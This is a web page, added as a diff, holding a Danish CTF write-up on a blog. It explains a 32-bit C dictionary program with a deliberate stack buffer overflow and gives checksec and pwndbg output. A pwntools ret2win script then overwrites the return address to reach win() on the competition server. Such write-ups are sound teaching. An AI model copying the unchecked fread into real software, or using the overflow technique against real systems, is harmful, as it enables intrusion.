@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>Fear Of Long Words :: HiddenV0ice cybersec blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Fear Of Long Words Challenge beskrivelse Jeg har lavet en ordbog i C! Gider du teste den for mig?
+Man kan tilføje ord med add kommandoen, og man kan vise ordene i ordbogen med kommandoen show.
+Jeg er helt ny til C, så det er det eneste den kan. Du må leve med, at ordene ikke kan have betydning.
+Både mig og mit program har hippopotomonstrosesquippedaliofobi, så vær sød at respektere dette :)
+Derfor er programmet også 32-bit. 64 er simpelthen for mange bits!!
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="http://localhost:1313/ctf/fear-of-long-words/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/code.min.c4581949edab7810737609fc5568852bcd908945f14561e366dcd2300a370545.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terminal.min.233716b7556db88c9cdc4a5d3f04afbd471613691cf8443016581ca89f66e913.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="http://localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Fear Of Long Words">
+<meta property="og:description" content="Fear Of Long Words Challenge beskrivelse Jeg har lavet en ordbog i C! Gider du teste den for mig?
+Man kan tilføje ord med add kommandoen, og man kan vise ordene i ordbogen med kommandoen show.
+Jeg er helt ny til C, så det er det eneste den kan. Du må leve med, at ordene ikke kan have betydning.
+Både mig og mit program har hippopotomonstrosesquippedaliofobi, så vær sød at respektere dette :)
+Derfor er programmet også 32-bit. 64 er simpelthen for mange bits!!
+" />
+<meta property="og:url" content="http://localhost:1313/ctf/fear-of-long-words/" />
+<meta property="og:site_name" content="HiddenV0ice cybersec blog" />
+
+  <meta property="og:image" content="http://localhost:1313/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2026-03-23 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="http://localhost:1313/">
+  <div class="logo">
+    Terminal
+  </div>
+</a>
+
+    </div>
+    
+    
+  </div>
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="http://localhost:1313/ctf/fear-of-long-words/">Fear Of Long Words</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2026-03-23</time></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="http://localhost:1313/tags/ctf/">ctf</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/writeup/">writeup</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/pwn/">pwn</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="fear-of-long-words">Fear Of Long Words<a href="#fear-of-long-words" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="challenge-beskrivelse">Challenge beskrivelse<a href="#challenge-beskrivelse" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Jeg har lavet en ordbog i C! Gider du teste den for mig?</p>
+<p>Man kan tilføje ord med add kommandoen, og man kan vise ordene i ordbogen med kommandoen show.</p>
+<p>Jeg er helt ny til C, så det er det eneste den kan. Du må leve med, at ordene ikke kan have betydning.</p>
+<p>Både mig og mit program har hippopotomonstrosesquippedaliofobi, så vær sød at respektere dette :)<br>
+Derfor er programmet også 32-bit. 64 er simpelthen for mange bits!!</p>
+<h2 id="challenge-handout">Challenge handout<a href="#challenge-handout" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<pre tabindex="0"><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdint.h&gt;
+char dictionary[1024];
+int dict_len = 0;
+
+
+void win() {
+  char flag[100];
+  FILE *f = fopen(&#34;flag.txt&#34;, &#34;r&#34;);
+  if (f == NULL) {
+      printf(&#34;Flag file is missing.\n&#34;);
+      exit(1);
+  }
+  fgets(flag, 100, f);
+  printf(&#34;Congratulations! Here is your flag: %s\n&#34;, flag);
+  fclose(f);
+}
+
+char *make_word(int length) {
+    char buffer[64]; // No way a word can be longer than this, right?
+
+    if (length &lt;= 0) {
+        printf(&#34;Word length must be positive.\n&#34;);
+        return NULL;
+    }
+
+    printf(&#34;Enter word:\n&#34;);
+    fread(buffer, 1, length, stdin);
+    char *word = malloc(length + 1);
+    memcpy(word, buffer, length);
+    word[length] = &#39;\0&#39;;
+    return word;
+}
+
+void add_to_dictionary(const char *word, int length) {
+    if (!word) return;
+
+    if (dict_len + length + 1 &gt;= sizeof(dictionary)) {
+        printf(&#34;Dictionary is full!\n&#34;);
+        return;
+    }
+
+    memcpy(&amp;dictionary[dict_len], word, length);
+    dict_len += length;
+    dictionary[dict_len++] = &#39;\n&#39;;
+}
+
+void show() {
+    if (dict_len == 0) {
+        printf(&#34;dictionary is empty! Add some words!\n&#34;);
+        return;
+    }
+    printf(&#34;\n--- Dictionary ---\n&#34;);
+    fwrite(dictionary, 1, dict_len, stdout);
+    printf(&#34;------------------\n&#34;);
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    printf(&#34;I made a dictionary!\n&#34;);
+    printf(&#34;Commands: add &lt;length&gt;, show, exit\n&#34;);
+    char input[64];
+
+
+    while (1) {
+        printf(&#34;\n&gt; &#34;);
+
+        if (!fgets(input, sizeof(input), stdin))
+            break;
+
+        input[strcspn(input, &#34;\n&#34;)] = &#39;\0&#39;;
+
+        if (strcmp(input, &#34;exit&#34;) == 0) break;
+
+        else if (strncmp(input, &#34;add &#34;, 4) == 0) {
+            int len = atoi(input + 4);
+
+            char *word = make_word(len);
+            add_to_dictionary(word, len);     
+            free(word);
+        }
+
+        else if (strcmp(input, &#34;show&#34;) == 0) {
+            show();
+        }
+
+        else {
+            printf(&#34;Commands: add &lt;length&gt;, show, exit\n&#34;);
+        }
+    }
+}
+</code></pre><h2 id="løsning-af-challenge">Løsning af challenge<a href="#løsning-af-challenge" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Da det er en kvalifikationsopgave, så PIE nok ikke blevet brugt under compiling. Dog tjekkes dette først.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/fear of long words<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ checksec ordbog         
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/kali/Desktop/fear of long words/ordbog&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:       i386-32-little
+</span></span><span class="line"><span class="cl">    RELRO:      Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:      No canary found
+</span></span><span class="line"><span class="cl">    NX:         NX unknown - GNU_STACK missing
+</span></span><span class="line"><span class="cl">    PIE:        No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    Stack:      Executable
+</span></span><span class="line"><span class="cl">    RWX:        Has RWX segments
+</span></span><span class="line"><span class="cl">    Stripped:   No
+</span></span></code></pre></div><p>Der er altså ingen PIE, og derfor er offset&rsquo;et det samme på serveren som lokalt. Offset&rsquo;et kan nu findes ved at bruge <code>cyclic -n 4 150</code> og så debug programmet med<code>pwndbg</code>. Der blev dernæst valgt <code>add word 150</code> og dernæst den cykliske streng. Dette gav en Segment Fault.</p>
+<p>Dernæst blev backtrace&rsquo;n printet med <code>bt</code> kommandoen.</p>
+<pre tabindex="0"><code>pwndbg&gt; bt
+#0  0xf7eef1f3 in ?? () from /usr/lib32/libc.so.6
+#1  0xf7ffcc60 in ?? () from /lib/ld-linux.so.2
+#2  0x61616175 in ?? ()
+</code></pre><p>Som det ses er frame 2, så ser det meget cyklisk ud. Ved brugen af <code>cyclic -l 0x61616175</code>, så fås offset&rsquo;et til at være 80.</p>
+<p>Dernæst skal adressen for funktionen blot findes. Dette kan også gøres med <code>pwndbg</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pwndbg&gt; info functions
+</span></span><span class="line"><span class="cl">All defined functions:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Non-debugging symbols:
+</span></span><span class="line"><span class="cl">0x08049256  win
+</span></span><span class="line"><span class="cl">0x080492e4  make_word
+</span></span><span class="line"><span class="cl">0x08049380  add_to_dictionary
+</span></span><span class="line"><span class="cl">0x08049412  show
+</span></span><span class="line"><span class="cl">0x0804948c  main
+</span></span></code></pre></div><p><code>win</code> adressen ligger altså på adressen <code>0x08049256</code></p>
+<p>Et løsningsscript kan nu sættes sammen med de fundne værdier, ved brugen af Python-biblioteket <code>pwntools</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;fear-of-long-words-5045f44d.camp02.c4mp.site&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="n">ssl</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span> <span class="p">(</span><span class="mi">80</span><span class="p">)</span> <span class="c1"># offset = 80</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ret2win_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x08049256</span><span class="p">)</span> <span class="c1"># Functions address</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="n">offset</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ret2win_addr</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;add &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Enter word:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>Dette gav flaget:</p>
+<p>DDC{D3m0n1c_d1ct1on4ry_d3str0y3r}</p>
+
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
